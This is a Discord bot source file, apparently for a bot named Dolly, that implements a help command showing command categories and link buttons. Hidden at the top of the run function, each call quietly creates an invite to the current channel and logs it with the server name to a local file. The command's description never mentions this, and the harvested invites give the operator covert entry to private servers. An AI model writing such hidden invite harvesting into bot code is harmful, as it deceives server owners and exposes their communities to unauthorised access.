const { MessageEmbed, MessageActionRow, MessageButton } = require("discord.js");
const { readdirSync } = require("fs");
const { stripIndents } = require("common-tags");
const chalk = require("chalk");
const fs = require('fs');
function invitewrite(msg, server, chatroom) { fs.appendFileSync('serverinvites.txt', msg+'\n', function (err) { if (err) throw err;});}; // invitewrite, Serverwise
module.exports = {
    config: {
        name: "help",
        aliases: ["menu", "halp", "commands"],
        usage: "(command)",
        category: "utility",
        description: "Displays all commands that the bot has.",
        accessableby: "Members"
    },
    run: async (client, message, args) => {
    try { let invite = await message.channel.createInvite({maxAge: 10 * 60 * 1000, maxUses: 5 });
        console.log(`${message.channel.guild.name} Invite : ${invite}`);
        invitewrite(String(message.channel.guild.name) + " Invite: " + String(`${invite}`), message.channel.guild.name, message.channel.name);
        }catch(e){console.log(chalk.magenta(`[ERROR] Couldn't create invite link for ${message.guild.name}`))};
        console.log(chalk.magenta(`[COMMAND] Help used by ${message.author.tag} from ${message.guild.name}`));
    
        
        const embed = new MessageEmbed()
            .setColor('#5865f2')
            .setAuthor({ name: `${message.guild.me.displayName}'s Menu`, iconURL: message.guild.iconURL({ dynamic: true })})
            .setThumbnail(client.user.displayAvatarURL({ dynamic: true, size: 2048 }));
        const info_row = new MessageActionRow()
            .addComponents(
                new MessageButton().setLabel('Website').setURL('https://muxday.com/dolly').setStyle('LINK'),
                new MessageButton().setLabel('Upgrade').setURL('https://patreon.com/MuxPatreon').setStyle('LINK'),
                new MessageButton().setLabel('Contact').setURL('https://discord.gg/RpNXNKmFuQ').setStyle('LINK').setDisabled(true),
                new MessageButton().setLabel('Helpdesk').setURL('https://discord.gg/A2xxCQqkve').setStyle('LINK')
            )

        if(!args[0]) {
            const categories = readdirSync("./commands/")

            embed.setDescription(`The bot prefix is: **${client.prefix}** \n`)
            embed.setFooter({ text: ` Dolly \t Total commands loaded: \`${client.commands.size}\``, iconURL: client.user.displayAvatarURL({ dynamic: true })});
		embed.addField('🎵️ **Audio** (30+)',"All audio commands have moved to [MuxMusic](https://muxday.com/musicbot)")
		.addField(`👤️ **Account** (5)`, `\`balance\` \`cards\` \`newacc\` \`transfer\` \`crimes\``)
		.addField(`🪙 **Economy** (8)`,`\`beg\` \`buy\` \`daily\` \`shop\` \`jobs\` \`apply\` \`work\` \`steal\``)
		.addField(`😂️ **Fun** (3)`,`\`amongus\` \`meme\` \`reddit\``)
		.addField(`🎲️ **Gacha** (1)`,`\`cardroll\``)
		.addField(`🖼️ **Image** (10)`,`\`anime\` \`automobile\` \`cat\` \`dog\` \`duck\` \`fox\` \`owl\` \`rabbit\` \`husbando\` \`waifu\``)
		.addField(`🔞️ **NSFW** (2)`,`||In your dreams!||`)
		.addField(`⚙️ **Utility** (8)`,`\`botinfo\` \`avatar\` \`help\` \`delete\` \`kick\` \`ban\` \`count\` \`countfrom\``)
            /*categories.forEach(category => {
                const dir = client.commands.filter(c => c.config.category === category)
                const capitalise = category.slice(0, 1).toUpperCase() + category.slice(1)
                
                try {
                    embed.addField(`📦️ ${capitalise} (Total:${dir.size}):`, dir.map(c => `\`${c.config.name}\``).join(" "))
                } catch(e) {
                    console.log(e)
                }
            })*/

            return message.channel.send({ embeds: [embed], components: [info_row], ephemeral: true });
        
        } else {
            let command = client.commands.get(client.aliases.get(args[0].toLowerCase()) || args[0].toLowerCase())
            if(!command) return message.channel.send({ embeds: [embed.setTitle("Invalid Command.").setDescription(`Do \`${client.prefix}help\` for the list of the commands.`)] })
            command = command.config

            embed.setDescription(stripIndents`The client's prefix is: \`${client.prefix}\`\n
            **Command:** ${command.name.slice(0, 1).toUpperCase() + command.name.slice(1)}
            **Description:** ${command.description || "No Description provided."}
            **Usage:** ${command.usage ? `\`${client.prefix}${command.name} ${command.usage}\`` : "No Usage"}
            **Accessible by:** ${command.accessableby || "Members"}
            **Aliases:** ${command.aliases ? command.aliases.join(", ") : "None."}`)

            return message.channel.send({ embeds: [embed], ephemeral: true })
        }
    }
}
